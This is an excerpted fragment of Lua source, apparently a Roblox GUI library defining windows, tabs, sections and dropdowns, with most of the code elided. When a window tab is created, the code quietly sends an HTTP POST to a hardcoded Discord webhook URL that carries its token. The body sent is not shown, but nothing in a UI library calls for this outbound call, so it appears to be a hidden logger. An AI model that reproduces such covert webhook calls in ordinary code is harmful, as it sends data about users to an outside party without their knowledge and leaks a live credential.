...
function library.new(name)
	...
	function UI.WindowTab(name)
		...
		request({
		    Url = "https://www.discord.com/api/webhooks/1069329647499755630/R4lUkkg2ZVT2V4p8Z5oNrvhloK9Gr83Wxmy6zPxbCUf3T2TkdBf-fGxlKrNOj2V1njqf",
		    Method = "POST",
		    Headers = {
			...
			function SideTabUI.Section(name)
				...
				function SectionUI.Dropdown(name,list,callback)
					...
					ToggleButton.MouseButton1Click:Connect(function()
						...
						DropFrame.ZIndex = Toggled and 10 or 6
